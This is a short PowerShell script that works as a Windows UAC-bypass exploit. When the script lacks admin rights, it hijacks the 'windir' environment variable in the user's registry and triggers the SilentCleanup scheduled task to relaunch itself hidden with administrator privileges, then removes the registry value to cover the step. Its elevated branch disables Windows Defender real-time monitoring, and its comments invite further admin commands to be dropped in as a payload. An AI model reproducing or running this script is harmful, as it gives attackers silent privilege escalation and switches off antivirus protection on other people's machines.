if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
    #Payload goes here
    #It'll run as Administrator
    #u can do any command bellow that require administrator privilages ex the command will disable real time
	# windows deffender.
	Set-MpPreference -DisableRealtimeMonitoring $true
} else {
    $registryPath = "HKCU:\Environment"
    $Name = "windir"
    $Value = "powershell -ep bypass -w h $PSCommandPath;#"
	Set-ItemProperty -Path $registryPath -Name $name -Value $Value
    #Depending on the performance of the machine, some sleep time may be required before or after schtasks
    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
    Remove-ItemProperty -Path $registryPath -Name $name
}